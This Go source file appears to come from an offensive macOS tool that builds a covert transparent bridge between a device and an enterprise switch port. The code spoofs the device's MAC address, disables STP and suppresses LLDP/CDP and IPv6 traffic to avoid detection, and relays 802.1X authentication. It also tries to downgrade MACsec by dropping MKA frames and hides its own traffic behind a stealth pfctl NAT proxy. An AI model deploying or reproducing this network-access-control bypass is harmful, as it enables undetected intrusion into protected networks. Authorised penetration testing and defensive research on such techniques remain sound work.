package bridge

import (
	"context"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/mcrn/goLAN/internal/eapol"
	"github.com/mcrn/goLAN/internal/stealth"
)

// BridgeState represents the current state of the bridge.
type BridgeState int

const (
	BridgeStateDown               BridgeState = iota
	BridgeStateCreated                        // bridge created but not fully up
	BridgeStateUp                             // bridge active and forwarding
	BridgeStateSniffing                       // bridge up, waiting for target identity
	BridgeStatePaused                         // failure occurred, waiting for user to continue
	BridgeStateReady                          // recon complete, bridge UP, awaiting user action
	BridgeStateStealthActive                  // stealth NAT and spoofing applied
	BridgeStateEAPOLDetected                  // 802.1X detected, relay setup pending
	BridgeStateEAPOLRelaying                  // actively relaying EAPOL auth frames
	BridgeStateEAPOLAuthenticated             // EAP-Success received, port is open
	BridgeStateEAPOLFailed                    // EAP-Failure received
	BridgeStateDowngrading                    // MACsec detected, attempting downgrade
)

func (s BridgeState) String() string {
	switch s {
	case BridgeStateDown:
		return "Down"
	case BridgeStateCreated:
		return "Created"
	case BridgeStateUp:
		return "Active"
	case BridgeStateSniffing:
		return "Sniffing..."
	case BridgeStatePaused:
		return "Paused"
	case BridgeStateReady:
		return "Ready"
	case BridgeStateStealthActive:
		return "Stealth Active"
	case BridgeStateEAPOLDetected:
		return "802.1X Detected"
	case BridgeStateEAPOLRelaying:
		return "802.1X Relaying"
	case BridgeStateEAPOLAuthenticated:
		return "802.1X Authenticated"
	case BridgeStateEAPOLFailed:
		return "802.1X Failed"
	case BridgeStateDowngrading:
		return "MACsec Downgrade"
	default:
		return "Unknown"
	}
}

// Bridge represents a macOS kernel bridge between two network interfaces.
type Bridge struct {
	mu             sync.Mutex
	name           string // e.g. "bridge0"
	ifaceA         string // first member interface (Device)
	ifaceB         string // second member interface (Switch)
	state          BridgeState
	origForwarding string // original ip.forwarding value before we changed it
	isStealth      bool
	targetID       *stealth.TargetIdentity
	cancelStealth  context.CancelFunc
	reconLogs      []string

	// User-controlled toggles
	continueOnFail  bool          // If true, auto-continue past failures (default: false)
	macsecDowngrade bool          // If true, drop MKA frames during relay (default: true)
	continueCh      chan struct{} // Unblocks bridge goroutine when user presses Continue

	// 802.1X EAPOL relay state
	eapolRelay   *eapol.Relay
	eapolSession *eapol.AuthSession
	cancelEAPOL  context.CancelFunc
}

// BridgeStatus is a snapshot of the bridge state for the TUI.
type BridgeStatus struct {
	Name      string
	IfaceA    string
	IfaceB    string
	State     BridgeState
	TargetID  *stealth.TargetIdentity
	ReconLogs []string

	// 802.1X fields
	EAPOLActive        bool
	EAPMethod          string
	EAPOLFramesRelayed int
	MACsecDetected     bool
}

// NewBridge creates a macOS kernel bridge between two interfaces.
// This requires root privileges.
func NewBridge(ifaceA, ifaceB string, ignoreMAC string) (*Bridge, error) {
	b := &Bridge{
		ifaceA:          ifaceA,
		ifaceB:          ifaceB,
		state:           BridgeStateDown,
		macsecDowngrade: true,
		continueCh:      make(chan struct{}, 1),
	}

	// Save original IP forwarding state.
	origFwd, err := sysctl("net.inet.ip.forwarding")
	if err == nil {
		b.origForwarding = origFwd
	}

	// Step 1: Create the bridge interface.
	out, err := runCmd("ifconfig", "bridge", "create")
	if err != nil {
		return nil, fmt.Errorf("creating bridge: %w (output: %s)", err, out)
	}
	b.name = strings.TrimSpace(out)
	b.state = BridgeStateCreated

	// Step 2: Bring ONLY the Device port up so we can silently sniff it.
	// We deliberately leave the Switch port electrically dead (DOWN) to prevent macOS
	// from leaking factory MAC discovery packets to the active switch!
	_, _ = runCmd("ifconfig", ifaceA, "up")

	// Step 3: Harden the bridge against Layer 2 leaks.
	// NOTE: STP must be disabled AFTER members are added (addm) — macOS bridge(4)
	// only accepts per-member STP config on existing members. This is done in onMacFunc.

	// Disable IPv6 forwarding globally to prevent NDP Router Solicitations
	// and Neighbor Discovery from leaking macOS host identity.
	_, _ = runCmd("sysctl", "-w", "net.inet6.ip6.forwarding=0")

	// We DELAY bridging them until the MAC is explicitly spoofed!
	b.state = BridgeStateCreated

	// Kick off stealth NAT setup if requested.
	// Hardcoded to true for now as per user request to use strat 1.
	b.isStealth = true

	if b.isStealth {
		ctx, cancel := context.WithCancel(context.Background())
		b.cancelStealth = cancel
		b.state = BridgeStateSniffing
		go b.runStealth(ctx, ignoreMAC)
	}

	return b, nil
}

// runStealth asynchronously sniffs the line and brings the bridge up.
// After MAC spoof and bridge UP, it enters BridgeStateReady and waits
// for the user to choose an action mode via the TUI.
func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
	// ifaceA is the Device Port. We sniff here because packets from the
	// device enter this port before traversing the bridge.
	sniff := stealth.NewSniffer(b.ifaceA)

	logFunc := func(msg string) {
		b.mu.Lock()
		b.reconLogs = append(b.reconLogs, msg)
		b.mu.Unlock()
	}

	onMacFunc := func(mac net.HardwareAddr) {
		b.mu.Lock()
		b.state = BridgeStateUp
		b.mu.Unlock()

		logFunc(fmt.Sprintf("[*] Activating bridge using spoofed Target MAC %s", mac.String()))
		runCmd("ifconfig", b.name, "ether", mac.String())

		logFunc(fmt.Sprintf("[*] Hard-spoofing Switch adapter factory MAC to %s", mac.String()))
		out, err := runCmd("ifconfig", b.ifaceB, "ether", mac.String())

		spoofFailed := false
		if err != nil {
			if strings.Contains(out, "Network is down") {
				logFunc("[*] Hardware spoof locked. Safe UP strobe initiated...")
				runCmd("ifconfig", b.ifaceB, "up")
				_, err = runCmd("ifconfig", b.ifaceB, "ether", mac.String())
				if err != nil {
					spoofFailed = true
					logFunc("[*] Adapter firmware locked — Bridge L2 masking will be used as fallback.")
				} else {
					logFunc("[+] Strobe successful: MAC spoof injected.")
				}
			} else {
				spoofFailed = true
				logFunc("[*] Adapter firmware locked — Bridge L2 masking will be used as fallback.")
			}
		}

		// If MAC spoof failed, check the continueOnFail toggle.
		if spoofFailed {
			b.mu.Lock()
			autoContine := b.continueOnFail
			b.mu.Unlock()

			if !autoContine {
				logFunc("[!] MAC spoof failed. Press [C] to continue or [Esc] to abort.")
				b.mu.Lock()
				b.state = BridgeStatePaused
				b.mu.Unlock()

				// Block until user presses Continue or context is cancelled.
				select {
				case <-b.continueCh:
					logFunc("[+] User confirmed continue. Proceeding with L2 masking fallback.")
					b.mu.Lock()
					b.state = BridgeStateUp
					b.mu.Unlock()
				case <-ctx.Done():
					return
				}
			}
		}

		logFunc("[*] Bridging device port to switch...")
		runCmd("ifconfig", b.name, "addm", b.ifaceA, "addm", b.ifaceB)

		// Disable STP on BOTH members — macOS bridges send BPDUs by default,
		// which triggers BPDU Guard on enterprise switches and instantly shuts the port.
		// This MUST happen AFTER addm — bridge(4) only accepts per-member config on existing members.
		runCmd("ifconfig", b.name, "stp", b.ifaceA, "disabled")
		runCmd("ifconfig", b.name, "stp", b.ifaceB, "disabled")

		// Suppress L2 discovery protocol leaks (LLDP/CDP/STP BPDUs) at the bridge level.
		// This MUST happen after addm but before the switch port goes UP.
		stealth.SuppressL2Leaks(b.name)

		logFunc("[*] Powering UP Switch adapter...")
		runCmd("ifconfig", b.ifaceB, "up")

		runCmd("ifconfig", b.name, "up")
		runCmd("sysctl", "-w", "net.inet.ip.forwarding=1")

		// Suppress IPv6 autoconf IMMEDIATELY to prevent link-local NDP leaks.
		// Previously this was in setupNATProxy() which was too late.
		runCmd("ifconfig", b.name, "inet6", "-autoconf")

		logFunc("[*] Bridge physical tunnel UP.")
		logFunc("[+] Transparent L2 passthrough active. No host traffic on the wire.")
	}

	id, err := sniff.Discover(ctx, ignoreMAC, logFunc, onMacFunc)
	if err != nil {
		logFunc(fmt.Sprintf("[!] Reconnaissance aborted: %v", err))
		return
	}

	b.mu.Lock()
	b.targetID = id
	b.state = BridgeStateReady
	b.mu.Unlock()

	logFunc("[+] Recon complete. Bridge is READY — choose an action mode.")

	// If gateway was not found during initial recon, start a background
	// sniffer that continues looking for it. Gateway is only needed for NAT.
	if !id.HasGateway() {
		go b.sniffGateway(ctx, ignoreMAC, logFunc)
	}
}

// sniffGateway continues passively sniffing for gateway information after
// the initial recon returned with just MAC+IP. Runs until gateway is found
// or context is cancelled.
func (b *Bridge) sniffGateway(ctx context.Context, ignoreMAC string, logFunc func(string)) {
	sniff := stealth.NewSniffer(b.ifaceA)

	// Discover will return immediately since MAC+IP are already set. We need
	// a fresh sniffer that keeps watching for DHCP ACKs and ARP from the gateway.
	// We re-use the same interface and look for gateway info in a separate Discover call.
	// Since onMacFunc already ran, it won't be called again (MAC is already known).
	noopMac := func(mac net.HardwareAddr) {}

	gwID, err := sniff.DiscoverGateway(ctx, ignoreMAC, logFunc, noopMac)
	if err != nil {
		return
	}

	if gwID != nil && gwID.HasGateway() {
		b.mu.Lock()
		b.targetID.Gateway = gwID.Gateway
		if len(b.targetID.Netmask) == 0 && len(gwID.Netmask) > 0 {
			b.targetID.Netmask = gwID.Netmask
		}
		b.mu.Unlock()
		logFunc("[+] Gateway discovered: " + gwID.Gateway.String())
		logFunc("[+] NAT proxy now available.")
	}
}

// Continue unblocks the bridge goroutine when it's paused on a failure.
func (b *Bridge) Continue() {
	select {
	case b.continueCh <- struct{}{}:
	default:
	}
}

// SetContinueOnFail sets whether the bridge auto-continues past failures.
func (b *Bridge) SetContinueOnFail(enabled bool) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.continueOnFail = enabled
}

// ContinueOnFail returns the current continue-on-fail setting.
func (b *Bridge) ContinueOnFail() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.continueOnFail
}

// SetMACsecDowngrade sets whether MKA frames are dropped during EAPOL relay.
func (b *Bridge) SetMACsecDowngrade(enabled bool) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.macsecDowngrade = enabled
}

// MACsecDowngrade returns the current MACsec downgrade setting.
func (b *Bridge) MACsecDowngrade() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.macsecDowngrade
}

// EAPOLDetected returns whether the sniffer detected 802.1X during recon.
func (b *Bridge) EAPOLDetected() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.targetID == nil {
		return false
	}
	return b.targetID.EAPOLDetected
}

// GatewayKnown returns whether the gateway IP has been discovered.
// NAT proxy requires the gateway to be known.
func (b *Bridge) GatewayKnown() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.targetID == nil {
		return false
	}
	return b.targetID.HasGateway()
}

// RunAutoMode runs the full automated post-recon flow: 802.1X probe → relay → NAT.
// This is the equivalent of the old monolithic runStealth() post-recon behavior.
func (b *Bridge) RunAutoMode(logFunc func(string)) {
	b.mu.Lock()
	id := b.targetID
	ctx, cancel := context.WithCancel(context.Background())
	b.cancelStealth = cancel
	b.mu.Unlock()

	if id == nil {
		logFunc("[!] Cannot run auto mode: no target identity.")
		return
	}

	// ── 802.1X Detection ──────────────────────────────────────────────────
	eapolActive := id.EAPOLDetected

	if !eapolActive {
		logFunc("[802.1X] Probing switch port for 802.1X authentication (45s timeout)...")
		detector := eapol.NewDetector(b.ifaceB)
		detectCtx, detectCancel := context.WithTimeout(ctx, 45*time.Second)
		result, detectErr := detector.Detect(detectCtx, 45*time.Second, logFunc)
		detectCancel()

		if detectErr == nil && result != nil && result.Detected {
			eapolActive = true
			if result.MACsecCapable {
				logFunc("[MACSEC] ⚠ MACsec capability detected on switch port.")
			}
		}
	}

	if eapolActive {
		logFunc("[802.1X] ● 802.1X authentication required on this network.")
		logFunc("[802.1X] Starting EAPOL relay between device and switch...")

		b.mu.Lock()
		b.state = BridgeStateEAPOLDetected
		b.mu.Unlock()

		b.runEAPOLRelay(ctx, logFunc)
	}

	// ── NAT Setup ──────────────────────────────────────────────────────────
	b.setupNATProxy(id, logFunc)
}

// RunListenEAPOL starts passive 802.1X detection — observe only, no relay.
func (b *Bridge) RunListenEAPOL(logFunc func(string)) {
	b.mu.Lock()
	ctx, cancel := context.WithCancel(context.Background())
	b.cancelStealth = cancel
	b.mu.Unlock()

	logFunc("[802.1X] Passive EAPOL listener started. Observing only — no relay.")

	detector := eapol.NewDetector(b.ifaceB)
	// Listen indefinitely until cancelled.
	result, err := detector.Detect(ctx, 5*time.Minute, logFunc)
	if err != nil {
		logFunc(fmt.Sprintf("[802.1X] Listener stopped: %v", err))
		return
	}
	if result != nil && result.Detected {
		logFunc("[802.1X] ✓ 802.1X confirmed on this port.")
		b.mu.Lock()
		b.state = BridgeStateEAPOLDetected
		b.mu.Unlock()
	} else {
		logFunc("[802.1X] No EAPOL frames detected. Network is not 802.1X protected.")
	}

	b.mu.Lock()
	b.state = BridgeStateReady
	b.mu.Unlock()
}

// RunEAPOLRelay starts the active EAPOL relay (requires 802.1X detected).
func (b *Bridge) RunEAPOLRelay(logFunc func(string)) {
	b.mu.Lock()
	ctx, cancel := context.WithCancel(context.Background())
	b.cancelStealth = cancel
	b.mu.Unlock()

	b.runEAPOLRelay(ctx, logFunc)
}

// RunNATProxy sets up the stealth NAT proxy (skips 802.1X).
func (b *Bridge) RunNATProxy(logFunc func(string)) {
	b.mu.Lock()
	id := b.targetID
	b.mu.Unlock()

	if id == nil {
		logFunc("[!] Cannot setup NAT: no target identity.")
		return
	}

	b.setupNATProxy(id, logFunc)
}

// RunInjectEAPOL sends an EAPOL-Start frame on the switch port to prompt
// the authenticator into sending EAP-Request/Identity. This is useful when
// the device needs to initiate 802.1X authentication from its side.
func (b *Bridge) RunInjectEAPOL(logFunc func(string)) {
	b.mu.Lock()
	mac := b.targetID
	b.mu.Unlock()

	if mac == nil {
		logFunc("[!] Cannot inject EAPOL: no target identity.")
		return
	}

	logFunc("[802.1X] Injecting EAPOL-Start on switch port to trigger authenticator...")
	if err := eapol.InjectEAPOLStart(b.ifaceB, mac.MAC, logFunc); err != nil {
		logFunc(fmt.Sprintf("[!] EAPOL-Start injection failed: %v", err))
	} else {
		logFunc("[+] EAPOL-Start injected. Listening for switch response...")
		// After injection, start passive listening to see if the switch responds.
		go b.RunListenEAPOL(logFunc)
	}
}

// runEAPOLRelay manages the 802.1X EAPOL relay lifecycle.
func (b *Bridge) runEAPOLRelay(ctx context.Context, logFunc func(string)) {
	b.mu.Lock()
	session := eapol.NewAuthSession(b.targetID.MAC)
	b.eapolSession = session
	b.state = BridgeStateEAPOLRelaying
	b.mu.Unlock()

	eapolCtx, eapolCancel := context.WithCancel(ctx)
	b.mu.Lock()
	b.cancelEAPOL = eapolCancel
	b.mu.Unlock()

	relay := eapol.NewRelay(b.ifaceA, b.ifaceB, session, logFunc)

	b.mu.Lock()
	b.eapolRelay = relay
	b.mu.Unlock()

	// Start the relay in a goroutine (it runs perpetually for re-auth).
	go func() {
		if err := relay.Start(eapolCtx); err != nil {
			logFunc(fmt.Sprintf("[802.1X] EAPOL relay error: %v", err))
		}
	}()

	// Wait for the initial authentication result.
	logFunc("[802.1X] Waiting for EAP authentication to complete...")
	authResult, err := relay.WaitForAuth(ctx)
	if err != nil {
		logFunc(fmt.Sprintf("[802.1X] Authentication wait error: %v", err))
		b.mu.Lock()
		b.state = BridgeStateEAPOLFailed
		b.mu.Unlock()
		return
	}

	if authResult.Success {
		logFunc(fmt.Sprintf("[802.1X] ✓ Authentication successful via %s", authResult.Method))
		logFunc("[802.1X] Port is now AUTHORIZED. Proceeding to NAT setup.")
		b.mu.Lock()
		b.state = BridgeStateEAPOLAuthenticated
		b.mu.Unlock()
	} else {
		logFunc("[802.1X] ✗ Authentication FAILED.")

		// If MACsec was detected and we haven't tried downgrade yet, attempt it.
		if authResult.MACsecDetected {
			logFunc("[MACSEC] Attempting MACsec downgrade...")
			b.mu.Lock()
			b.state = BridgeStateDowngrading
			b.mu.Unlock()

			relay.EnableDowngrade()

			// Wait for re-auth attempt after downgrade.
			logFunc("[MACSEC] Waiting for re-authentication after downgrade...")
			retryResult, retryErr := relay.WaitForAuth(ctx)
			if retryErr == nil && retryResult.Success {
				logFunc("[MACSEC] ✓ Downgrade successful! Authenticated without MACsec.")
				b.mu.Lock()
				b.state = BridgeStateEAPOLAuthenticated
				b.mu.Unlock()
			} else {
				logFunc("[MACSEC] ✗ Downgrade failed. Switch requires MACsec — bridging not possible.")
				b.mu.Lock()
				b.state = BridgeStateEAPOLFailed
				b.mu.Unlock()
				return
			}
		} else {
			logFunc("[802.1X] ✗ Authentication rejected. Check device credentials.")
			b.mu.Lock()
			b.state = BridgeStateEAPOLFailed
			b.mu.Unlock()
			return
		}
	}

	// The relay goroutine continues running to handle re-authentication.
	logFunc("[802.1X] EAPOL relay remains active for periodic re-authentication.")
}

// setupNATProxy configures the stealth NAT proxy on the bridge.
// This is called after 802.1X auth succeeds (or immediately if no 802.1X).
// Note: IPv6 autoconf is already suppressed in Phase 1 (runStealth).
func (b *Bridge) setupNATProxy(id *stealth.TargetIdentity, logFunc func(string)) {
	// Generate an orthogonal hidden IP to anchor the NAT proxy without colliding
	// with the host OS routing table for the Target's assigned DHCP subnet.
	targetStr := id.IP.String()
	hiddenIP := "192.168.254.10" // Default anchor
	if strings.HasPrefix(targetStr, "192.168.") {
		hiddenIP = "10.254.254.10"
	} else if strings.HasPrefix(targetStr, "10.") {
		hiddenIP = "172.16.254.10"
	} else if strings.HasPrefix(targetStr, "172.") {
		hiddenIP = "192.168.254.10"
	}

	logFunc(fmt.Sprintf("[*] Anchoring orthogonal Stealth Proxy IP: %s", hiddenIP))
	runCmd("ifconfig", b.name, hiddenIP, "netmask", "255.255.255.0", "up")

	logFunc("[*] Activating Stealth NAT proxy on bridge...")
	rule := stealth.PFRule{
		Interface: b.name,
		HiddenIP:  hiddenIP,
		TargetIP:  id.IP.String(),
	}
	err := stealth.EnableNAT(rule)
	if err != nil {
		logFunc(fmt.Sprintf("[!] ERROR injecting NAT: %v", err))
	} else {
		logFunc("[+] pfctl rules active. Stealth proxy seamlessly engaged.")
	}

	logFunc("[+] Air-gap finalized. Safe to plug in the Router LAN.")

	b.mu.Lock()
	b.state = BridgeStateStealthActive
	b.mu.Unlock()

	// Launch a background EAPOL watcher on the switch port. Some switches have
	// very long MAB fallback timers (60-90s). If 802.1X frames appear AFTER
	// our initial detection window, we retroactively start the relay.
	b.mu.Lock()
	needsWatcher := b.eapolSession == nil
	b.mu.Unlock()
	if needsWatcher {
		go b.backgroundEAPOLWatch(logFunc)
	}
}

// backgroundEAPOLWatch monitors the switch port for late-arriving EAPOL frames.
// This catches switches with long MAB fallback timers that send EAPOL-Request/Identity
// after our initial detection timeout expired.
func (b *Bridge) backgroundEAPOLWatch(logFunc func(string)) {
	// Create a cancellable context tied to the bridge's lifecycle.
	// When the bridge is destroyed, cancelStealth fires, which cancels this too.
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Store the cancel so destroy() can stop the background watcher.
	b.mu.Lock()
	origCancel := b.cancelEAPOL
	b.cancelEAPOL = func() {
		cancel()
		if origCancel != nil {
			origCancel()
		}
	}
	b.mu.Unlock()

	detector := eapol.NewDetector(b.ifaceB)
	// Long poll — listen for up to 5 minutes for late 802.1X.
	result, err := detector.Detect(ctx, 5*time.Minute, func(msg string) {
		// Only log EAPOL-related messages to avoid spamming recon log.
		if strings.Contains(msg, "EAPOL") || strings.Contains(msg, "802.1X") {
			logFunc(msg)
		}
	})

	if err != nil || result == nil || !result.Detected {
		return // No late EAPOL — network is not 802.1X
	}

	// Late EAPOL detected! Start the relay retroactively.
	logFunc("[802.1X] ⚠ Late EAPOL detected after NAT setup — starting relay retroactively.")

	b.mu.Lock()
	b.state = BridgeStateEAPOLDetected
	b.mu.Unlock()

	b.runEAPOLRelay(ctx, logFunc)

	// Re-apply stealth after auth succeeds.
	b.mu.Lock()
	if b.state == BridgeStateEAPOLAuthenticated {
		b.state = BridgeStateStealthActive
	}
	b.mu.Unlock()
}

// Name returns the kernel name of the bridge (e.g. "bridge0").
func (b *Bridge) Name() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.name
}

// State returns the current bridge state.
func (b *Bridge) State() BridgeState {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.state
}

// AppendLog appends a message to the bridge's recon log.
// This allows external callers (e.g., TUI action modes) to inject log entries.
func (b *Bridge) AppendLog(msg string) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.reconLogs = append(b.reconLogs, msg)
}

// IfaceA returns the name of the first member interface.
func (b *Bridge) IfaceA() string {
	return b.ifaceA
}

// IfaceB returns the name of the second member interface.
func (b *Bridge) IfaceB() string {
	return b.ifaceB
}

// Status returns a snapshot of the bridge state.
func (b *Bridge) Status() BridgeStatus {
	b.mu.Lock()
	name := b.name
	session := b.eapolSession
	status := BridgeStatus{
		Name:      name,
		IfaceA:    b.ifaceA,
		IfaceB:    b.ifaceB,
		State:     b.state,
		TargetID:  b.targetID,
		ReconLogs: append([]string(nil), b.reconLogs...), // copy so UI slice is safe
	}
	b.mu.Unlock()

	// Populate 802.1X status from the active session.
	// Done outside b.mu to avoid nested lock (b.mu → session.mu).
	if session != nil {
		snap := session.Snapshot()
		status.EAPOLActive = snap.State == eapol.StateRelaying || snap.State == eapol.StateAuthenticated
		status.EAPMethod = string(snap.Method)
		status.EAPOLFramesRelayed = snap.FramesRelayed
		status.MACsecDetected = snap.MACsecDetected
	}

	return status
}

// Destroy tears down the bridge, removes members, and restores IP forwarding.
func (b *Bridge) Destroy() error {
	// Snapshot cancel functions to avoid deadlocks with goroutines
	// (like the sniffer) that attempt to log and acquire mu on cancellation.
	b.mu.Lock()
	cancelStealth := b.cancelStealth
	cancelEAPOL := b.cancelEAPOL
	b.mu.Unlock()

	if cancelStealth != nil {
		cancelStealth()
	}
	if cancelEAPOL != nil {
		cancelEAPOL()
	}

	b.mu.Lock()
	defer b.mu.Unlock()
	return b.destroy()
}

// destroy is the internal teardown (must hold mu).
func (b *Bridge) destroy() error {
	if b.name == "" {
		return nil
	}

	if b.isStealth {
		stealth.DisableNAT()
	}

	var errs []string

	// On macOS, destroying the bridge interface automatically unbinds all members.
	// This reduces 4 synchronous commands down to 1, eliminating TUI freezing.
	if _, err := runCmd("ifconfig", b.name, "destroy"); err != nil {
		errs = append(errs, fmt.Sprintf("destroying %s: %v", b.name, err))
	}

	// Restore original IP forwarding setting.
	if b.origForwarding != "" {
		val := strings.TrimSpace(b.origForwarding)
		_, _ = runCmd("sysctl", "-w", "net.inet.ip.forwarding="+val)
	}

	b.state = BridgeStateDown

	if len(errs) > 0 {
		return fmt.Errorf("teardown errors: %s", strings.Join(errs, "; "))
	}
	return nil
}

// CleanupStaleBridges finds and destroys any existing bridge interfaces
// and flushes stale pfctl NAT rules. Useful for recovering from a crashed session.
func CleanupStaleBridges() ([]string, error) {
	out, err := runCmd("ifconfig", "-l")
	if err != nil {
		return nil, fmt.Errorf("listing interfaces: %w", err)
	}

	var cleaned []string
	for _, name := range strings.Fields(out) {
		if strings.HasPrefix(name, "bridge") {
			if _, err := runCmd("ifconfig", name, "destroy"); err == nil {
				cleaned = append(cleaned, name)
			}
		}
	}

	// Also flush the pfctl anchor to remove stale NAT/firewall rules.
	_ = stealth.DisableNAT()

	return cleaned, nil
}

// runCmd executes a command and returns its combined output.
func runCmd(name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// sysctl reads a sysctl value and returns just the value part.
// e.g. "net.inet.ip.forwarding: 0" → "0"
func sysctl(key string) (string, error) {
	out, err := runCmd("sysctl", key)
	if err != nil {
		return "", err
	}
	parts := strings.SplitN(strings.TrimSpace(out), ":", 2)
	if len(parts) == 2 {
		return strings.TrimSpace(parts[1]), nil
	}
	return strings.TrimSpace(out), nil
}
